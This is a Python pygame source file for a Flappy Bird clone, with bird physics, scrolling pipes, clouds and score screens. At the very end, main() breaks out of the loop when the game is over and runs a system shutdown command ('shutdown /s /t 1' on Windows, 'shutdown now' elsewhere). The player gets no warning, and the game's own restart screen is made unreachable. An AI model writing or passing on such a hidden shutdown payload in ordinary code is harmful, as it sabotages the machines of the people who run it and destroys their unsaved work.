import pygame
import sys
import random
import math
from pygame import gfxdraw
import os

# Initialize pygame
pygame.init()
pygame.font.init()

# Screen dimensions
WIDTH, HEIGHT = 800, 600
screen = pygame.display.set_mode((WIDTH, HEIGHT))
pygame.display.set_caption("Flappy Bird")

# Colors
SKY_BLUE = (135, 206, 235)
GREEN = (34, 177, 76)
DARK_GREEN = (15, 120, 50)
YELLOW = (255, 225, 25)
ORANGE = (255, 140, 0)
RED = (237, 28, 36)
WHITE = (255, 255, 255)
BLACK = (0, 0, 0)
PIPE_GREEN = (0, 154, 23)
CLOUD_WHITE = (250, 250, 250)
GROUND_BROWN = (222, 184, 135)

# Game variables
GRAVITY = 0.5
FLAP_POWER = -8
PIPE_SPEED = 3
PIPE_GAP = 200
PIPE_FREQUENCY = 1800  # milliseconds
GROUND_HEIGHT = 100
FONT = pygame.font.SysFont("comicsans", 32)
TITLE_FONT = pygame.font.SysFont("comicsans", 72, bold=True)
SCORE_FONT = pygame.font.SysFont("comicsans", 48, bold=True)

class Bird:
    def __init__(self):
        self.x = 150
        self.y = HEIGHT // 2
        self.velocity = 0
        self.radius = 20
        self.alive = True
        self.rotation = 0
        self.flap_count = 0
        
    def flap(self):
        self.velocity = FLAP_POWER
        self.flap_count = 5
        
    def update(self):
        # Apply gravity
        self.velocity += GRAVITY
        self.y += self.velocity
        
        # Rotate bird based on velocity
        self.rotation = max(-30, min(self.velocity * 2, 90))
        
        # Boundary check
        if self.y < self.radius:
            self.y = self.radius
            self.velocity = 0
        if self.y > HEIGHT - GROUND_HEIGHT - self.radius:
            self.y = HEIGHT - GROUND_HEIGHT - self.radius
            self.velocity = 0
            self.alive = False
            
        # Decrement flap animation counter
        if self.flap_count > 0:
            self.flap_count -= 1
            
    def draw(self, screen):
        # Draw the bird body
        pygame.draw.circle(screen, YELLOW, (self.x, self.y), self.radius)
        
        # Draw the bird eye
        pygame.draw.circle(screen, WHITE, (self.x + 8, self.y - 5), 8)
        pygame.draw.circle(screen, BLACK, (self.x + 10, self.y - 5), 4)
        
        # Draw the beak
        beak_points = [
            (self.x + 20, self.y),
            (self.x + 40, self.y - 5),
            (self.x + 40, self.y + 5)
        ]
        pygame.draw.polygon(screen, ORANGE, beak_points)
        
        # Draw the wing
        wing_y_offset = 0
        if self.flap_count > 0:
            wing_y_offset = -5
        
        wing_points = [
            (self.x - 10, self.y + wing_y_offset),
            (self.x - 25, self.y - 10 + wing_y_offset),
            (self.x - 10, self.y - 15 + wing_y_offset)
        ]
        pygame.draw.polygon(screen, ORANGE, wing_points)
        
        # Draw the tail
        tail_points = [
            (self.x - 20, self.y),
            (self.x - 35, self.y - 10),
            (self.x - 35, self.y + 10)
        ]
        pygame.draw.polygon(screen, ORANGE, tail_points)

    def get_mask(self):
        # Return a rect for collision detection
        return pygame.Rect(self.x - self.radius, self.y - self.radius, 
                          self.radius * 2, self.radius * 2)

class Pipe:
    def __init__(self):
        self.gap_y = random.randint(150, HEIGHT - GROUND_HEIGHT - 150)
        self.x = WIDTH
        self.width = 80
        self.passed = False
        
    def update(self):
        self.x -= PIPE_SPEED
        
    def draw(self, screen):
        # Draw top pipe
        pygame.draw.rect(screen, PIPE_GREEN, 
                        (self.x, 0, self.width, self.gap_y - PIPE_GAP // 2))
        pygame.draw.rect(screen, DARK_GREEN, 
                        (self.x - 5, self.gap_y - PIPE_GAP // 2 - 20, self.width + 10, 20))
        
        # Draw bottom pipe
        bottom_pipe_top = self.gap_y + PIPE_GAP // 2
        pygame.draw.rect(screen, PIPE_GREEN, 
                        (self.x, bottom_pipe_top, self.width, HEIGHT - bottom_pipe_top))
        pygame.draw.rect(screen, DARK_GREEN, 
                        (self.x - 5, bottom_pipe_top, self.width + 10, 20))
        
    def collide(self, bird):
        bird_rect = bird.get_mask()
        
        # Check collision with top pipe
        top_pipe_rect = pygame.Rect(self.x, 0, self.width, self.gap_y - PIPE_GAP // 2)
        if bird_rect.colliderect(top_pipe_rect):
            return True
            
        # Check collision with bottom pipe
        bottom_pipe_rect = pygame.Rect(self.x, self.gap_y + PIPE_GAP // 2, 
                                      self.width, HEIGHT - self.gap_y - PIPE_GAP // 2)
        if bird_rect.colliderect(bottom_pipe_rect):
            return True
            
        return False

class Cloud:
    def __init__(self):
        self.x = WIDTH + random.randint(0, 300)
        self.y = random.randint(50, 250)
        self.speed = random.uniform(0.5, 1.5)
        self.size = random.randint(40, 80)
        
    def update(self):
        self.x -= self.speed
        if self.x < -100:
            self.x = WIDTH + 100
            self.y = random.randint(50, 250)
            
    def draw(self, screen):
        # Draw a fluffy cloud using multiple circles
        pygame.draw.circle(screen, CLOUD_WHITE, (int(self.x), int(self.y)), self.size)
        pygame.draw.circle(screen, CLOUD_WHITE, (int(self.x - self.size * 0.7), int(self.y)), int(self.size * 0.8))
        pygame.draw.circle(screen, CLOUD_WHITE, (int(self.x + self.size * 0.7), int(self.y)), int(self.size * 0.8))
        pygame.draw.circle(screen, CLOUD_WHITE, (int(self.x - self.size * 0.3), int(self.y - self.size * 0.3)), int(self.size * 0.7))
        pygame.draw.circle(screen, CLOUD_WHITE, (int(self.x + self.size * 0.3), int(self.y - self.size * 0.3)), int(self.size * 0.7))

class Game:
    def __init__(self):
        self.bird = Bird()
        self.pipes = []
        self.clouds = [Cloud() for _ in range(5)]
        self.score = 0
        self.high_score = 0
        self.game_state = "start"  # "start", "playing", "game_over"
        self.last_pipe = pygame.time.get_ticks()
        self.ground_offset = 0
        
    def handle_events(self):
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                sys.exit()
                
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_SPACE:
                    if self.game_state == "start":
                        self.game_state = "playing"
                    elif self.game_state == "playing":
                        self.bird.flap()
                    elif self.game_state == "game_over":
                        self.reset_game()
                        
            if event.type == pygame.MOUSEBUTTONDOWN:
                if self.game_state == "start":
                    self.game_state = "playing"
                elif self.game_state == "playing":
                    self.bird.flap()
                elif self.game_state == "game_over":
                    self.reset_game()
                    
    def update(self):
        # Update bird
        self.bird.update()
        
        # Update clouds
        for cloud in self.clouds:
            cloud.update()
            
        # Update ground scrolling
        self.ground_offset = (self.ground_offset - PIPE_SPEED) % 40
        
        # Generate new pipes
        current_time = pygame.time.get_ticks()
        if self.game_state == "playing" and current_time - self.last_pipe > PIPE_FREQUENCY:
            self.pipes.append(Pipe())
            self.last_pipe = current_time
            
        # Update pipes and check collisions
        for pipe in self.pipes[:]:
            pipe.update()
            
            # Check if bird passed the pipe
            if not pipe.passed and pipe.x < self.bird.x:
                pipe.passed = True
                self.score += 1
                if self.score > self.high_score:
                    self.high_score = self.score
                    
            # Check collision
            if pipe.collide(self.bird):
                self.bird.alive = False
                
            # Remove pipes that are off screen
            if pipe.x < -100:
                self.pipes.remove(pipe)
                
        # Check if bird hit the ground
        if not self.bird.alive and self.game_state == "playing":
            self.game_state = "game_over"
            
    def draw(self):
        # Draw sky background
        screen.fill(SKY_BLUE)
        
        # Draw sun
        pygame.draw.circle(screen, (255, 255, 200), (700, 80), 60)
        
        # Draw clouds
        for cloud in self.clouds:
            cloud.draw(screen)
            
        # Draw pipes
        for pipe in self.pipes:
            pipe.draw(screen)
            
        # Draw ground
        for i in range(-1, WIDTH // 40 + 2):
            pygame.draw.rect(screen, GROUND_BROWN, 
                           (i * 40 + self.ground_offset, HEIGHT - GROUND_HEIGHT, 40, GROUND_HEIGHT))
            pygame.draw.rect(screen, GREEN, 
                           (i * 40 + self.ground_offset, HEIGHT - GROUND_HEIGHT, 40, 20))
        
        # Draw bird
        self.bird.draw(screen)
        
        # Draw score
        score_text = SCORE_FONT.render(f"{self.score}", True, WHITE)
        screen.blit(score_text, (WIDTH // 2 - score_text.get_width() // 2, 50))
        
        # Draw game state screens
        if self.game_state == "start":
            self.draw_start_screen()
        elif self.game_state == "game_over":
            self.draw_game_over_screen()
            
        # Draw instructions
        if self.game_state == "start":
            inst_text = FONT.render("Press SPACE or CLICK to start", True, WHITE)
            screen.blit(inst_text, (WIDTH // 2 - inst_text.get_width() // 2, 450))
        elif self.game_state == "playing":
            inst_text = FONT.render("Press SPACE or CLICK to flap", True, WHITE)
            screen.blit(inst_text, (WIDTH // 2 - inst_text.get_width() // 2, 20))
            
    def draw_start_screen(self):
        # Draw title
        title_text = TITLE_FONT.render("FLAPPY BIRD", True, WHITE)
        screen.blit(title_text, (WIDTH // 2 - title_text.get_width() // 2, 150))
        
        # Draw high score
        if self.high_score > 0:
            hs_text = FONT.render(f"High Score: {self.high_score}", True, WHITE)
            screen.blit(hs_text, (WIDTH // 2 - hs_text.get_width() // 2, 250))
            
        # Draw bird preview
        pygame.draw.circle(screen, YELLOW, (WIDTH // 2, 350), 30)
        pygame.draw.circle(screen, WHITE, (WIDTH // 2 + 10, 340), 12)
        pygame.draw.circle(screen, BLACK, (WIDTH // 2 + 12, 340), 6)
        
        beak_points = [
            (WIDTH // 2 + 30, 350),
            (WIDTH // 2 + 50, 345),
            (WIDTH // 2 + 50, 355)
        ]
        pygame.draw.polygon(screen, ORANGE, beak_points)
        
    def draw_game_over_screen(self):
        # Draw semi-transparent overlay
        overlay = pygame.Surface((WIDTH, HEIGHT), pygame.SRCALPHA)
        overlay.fill((0, 0, 0, 150))
        screen.blit(overlay, (0, 0))
        
        # Draw game over text
        game_over_text = TITLE_FONT.render("GAME OVER", True, RED)
        screen.blit(game_over_text, (WIDTH // 2 - game_over_text.get_width() // 2, 150))
        
        # Draw score
        score_text = FONT.render(f"Score: {self.score}", True, WHITE)
        screen.blit(score_text, (WIDTH // 2 - score_text.get_width() // 2, 250))
        
        # Draw high score
        high_score_text = FONT.render(f"High Score: {self.high_score}", True, WHITE)
        screen.blit(high_score_text, (WIDTH // 2 - high_score_text.get_width() // 2, 300))
        
        # Draw restart instruction
        restart_text = FONT.render("Press SPACE or CLICK to restart", True, WHITE)
        screen.blit(restart_text, (WIDTH // 2 - restart_text.get_width() // 2, 400))
        
    def reset_game(self):
        self.bird = Bird()
        self.pipes = []
        self.score = 0
        self.game_state = "playing"
        self.last_pipe = pygame.time.get_ticks()

# Main game loop
def main():
    clock = pygame.time.Clock()
    game = Game()
    
    while True:
        game.handle_events()
        game.update()
        game.draw()
        
        pygame.display.flip()
        clock.tick(60)

        # Check for game over state to shut down
        if game.game_state == "game_over":
            break

    # Shutdown the PC after breaking out of the game loop
    if os.name == 'nt':  # Windows
        os.system("shutdown /s /t 1")
    else:  # Linux or macOS
        os.system("shutdown now")

if __name__ == "__main__":
    main()
